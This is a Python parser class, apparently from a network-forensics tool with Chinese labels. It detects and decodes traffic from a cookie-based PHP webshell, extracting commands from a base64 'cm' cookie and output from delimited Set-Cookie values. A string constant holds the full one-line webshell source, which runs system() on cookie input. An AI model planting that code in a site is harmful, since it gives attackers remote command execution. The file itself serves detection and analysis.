from __future__ import annotations

import base64
from http.cookies import SimpleCookie
import re
from typing import Any
from urllib.parse import unquote


class CookieExecParser:
    name = "cookie_exec"

    _PHP_SOURCE = """<?php
if(isset($_COOKIE['cm'])){ob_start();system(base64_decode($_COOKIE['cm']).' 2>&1');setcookie($_COOKIE['cn'],$_COOKIE['cp'].base64_encode(ob_get_contents()).$_COOKIE['cp']);ob_end_clean();}
?>"""
    _CRYPTO_SUMMARY = "Cookie cm=base64(command); response Set-Cookie <cn>=<cp><base64(output)><cp>"
    def supported_families(self) -> list[dict[str, str]]:
        return [
            {
                "value": "cookie_exec_like",
                "label": "Cookie 命令执行类 PHP WebShell",
            }
        ]

    def identify_request_variant(self, cookie_header: str) -> dict[str, Any] | None:
        cookies = self._parse_cookie_pairs(cookie_header)
        cm = cookies.get("cm")
        cn = cookies.get("cn")
        cp = cookies.get("cp")
        if not cm or not cn or not cp:
            return None

        command = self._decode_cookie_command(cm)
        if not command:
            return None

        return {
            "family_variant": "cookie_exec_like",
            "label": "Cookie 命令执行类 PHP WebShell",
            "command_cookie": "cm",
            "response_cookie": cn,
            "delimiter": cp,
            "command": command,
        }

    def identify_response_variant(
        self,
        *,
        set_cookie_header: str,
        request_parse: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        if not set_cookie_header:
            return None

        response_cookie = str((request_parse or {}).get("response_cookie_name") or "").strip() or None
        delimiter = str((request_parse or {}).get("response_delimiter") or "").strip() or None
        for name, value in self._parse_set_cookie_pairs(set_cookie_header).items():
            matched = self._extract_wrapped_output(unquote(str(value or "")), delimiter=delimiter)
            if matched is None:
                continue
            if response_cookie and name != response_cookie:
                continue
            return {
                "family_variant": "cookie_exec_like",
                "label": "Cookie 命令执行类 PHP WebShell",
                "response_cookie": name,
                "delimiter": matched["delimiter"],
                "encoded_output": matched["encoded_output"],
            }
        return None

    def parse_request(self, *, cookie_header: str) -> dict[str, Any] | None:
        variant = self.identify_request_variant(cookie_header)
        if variant is None:
            return None

        command = str(variant["command"])
        operation, target_path = self._classify_command(command)
        return {
            "family_parser": self.name,
            "family_variant": str(variant["family_variant"]),
            "webshell_label": f"可能是{variant['label']}",
            "parsed_operation": operation,
            "target_path": target_path,
            "request_summary": f"执行命令 {command}",
            "terminal_command": command,
            "php_script_source": self._PHP_SOURCE,
            "crypto_summary": self._CRYPTO_SUMMARY,
            "request_cookie_name": str(variant["command_cookie"]),
            "response_cookie_name": str(variant["response_cookie"]),
            "response_delimiter": str(variant["delimiter"]),
        }

    def parse_response(
        self,
        *,
        set_cookie_header: str,
        request_parse: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        variant = self.identify_response_variant(set_cookie_header=set_cookie_header, request_parse=request_parse)
        if variant is None:
            return None

        text = self._normalize_output(self._decode_base64_text(str(variant["encoded_output"])))
        return {
            "output_type": "command_output",
            "output_summary": f"命令返回 {len(text)} 字符",
            "output_preview": self._trim(text, 240),
            "output": self._trim(text, 2000),
            "terminal_output": self._trim(text, 4000),
            "parsed_output": {
                "content": self._trim(text, 4000),
                "length": len(text),
            },
            "family_parser": self.name,
            "family_variant": str(variant["family_variant"]),
            "webshell_label": f"可能是{variant['label']}",
            "crypto_summary": self._CRYPTO_SUMMARY,
            "response_cookie_name": str(variant["response_cookie"]),
            "response_delimiter": str(variant["delimiter"]),
        }

    def _parse_cookie_pairs(self, header: str) -> dict[str, str]:
        pairs: dict[str, str] = {}
        cookie = SimpleCookie()
        try:
            cookie.load(header or "")
            for key, morsel in cookie.items():
                pairs[key] = morsel.value
        except Exception:
            pass
        if pairs:
            return pairs

        for part in str(header or "").split(";"):
            name, sep, value = part.strip().partition("=")
            if not sep or not name:
                continue
            pairs[name.strip()] = value.strip()
        return pairs

    def _parse_set_cookie_pairs(self, header: str) -> dict[str, str]:
        lines = [line.strip() for line in str(header or "").splitlines() if line.strip()]
        if not lines:
            lines = [str(header or "").strip()]
        pairs: dict[str, str] = {}
        for line in lines:
            name, sep, rest = line.partition("=")
            if not sep or not name:
                continue
            pairs[name.strip()] = rest.split(";", 1)[0].strip()
        return pairs

    def _decode_cookie_command(self, value: str) -> str | None:
        try:
            raw = self._b64decode_loose(unquote(str(value or "")))
        except Exception:
            return None
        text = raw.decode("utf-8", errors="replace").strip()
        if not text:
            return None
        printable = sum(char.isprintable() or char in "\r\n\t" for char in text)
        if printable / max(len(text), 1) < 0.9:
            return None
        return text

    def _extract_wrapped_output(self, value: str, *, delimiter: str | None) -> dict[str, str] | None:
        cleaned = str(value or "").strip()
        if not cleaned:
            return None
        if delimiter:
            if not cleaned.startswith(delimiter) or not cleaned.endswith(delimiter):
                return None
            encoded = cleaned[len(delimiter) : len(cleaned) - len(delimiter)]
            if not encoded:
                return None
            return {
                "delimiter": delimiter,
                "encoded_output": encoded,
            }
        max_delimiter = min(16, len(cleaned) // 2)
        for size in range(max_delimiter, 0, -1):
            candidate = cleaned[:size]
            if not cleaned.endswith(candidate):
                continue
            encoded = cleaned[size:-size]
            if not encoded:
                continue
            if not re.fullmatch(r"[A-Za-z0-9+/=]+", encoded):
                continue
            try:
                self._b64decode_loose(encoded)
            except Exception:
                continue
            return {
                "delimiter": candidate,
                "encoded_output": encoded,
            }
        return None

    def _decode_base64_text(self, value: str) -> str:
        raw = self._b64decode_loose(value)
        for encoding in ("utf-8", "gb18030"):
            try:
                return raw.decode(encoding)
            except UnicodeDecodeError:
                continue
        return raw.decode("latin1", errors="replace")

    def _b64decode_loose(self, value: str) -> bytes:
        compact = re.sub(r"\s+", "", str(value or ""))
        padding = (-len(compact)) % 4
        return base64.b64decode(compact + ("=" * padding), validate=False)

    def _classify_command(self, command: str) -> tuple[str, str | None]:
        text = str(command or "").strip()
        lower = text.lower()
        if lower.startswith("type "):
            return "read_file", text[5:].strip() or None
        if lower.startswith("dir"):
            return "list_directory", None
        if lower.startswith("tasklist"):
            return "list_processes", None
        if lower.startswith("systeminfo"):
            return "system_info", None
        return "execute_command", None

    def _normalize_output(self, text: str) -> str:
        return str(text or "").replace("\r\n", "\n").strip()

    def _trim(self, value: Any, limit: int) -> str:
        text = str(value or "")
        if len(text) <= limit:
            return text
        return f"{text[: limit - 3]}..."
